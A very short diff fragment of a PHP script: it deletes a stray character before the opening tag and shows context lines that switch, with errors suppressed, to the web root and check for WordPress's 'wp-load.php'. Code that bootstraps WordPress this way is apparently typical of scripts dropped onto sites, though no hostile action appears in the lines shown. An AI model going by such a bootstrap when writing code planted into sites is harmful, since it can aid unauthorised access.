@@ -1,4 +1,4 @@
-a<?php
+<?php
 $mr=$_SERVER['DOCUMENT_ROOT'];
 @chdir($mr);
 if (file_exists('wp-load.php')){
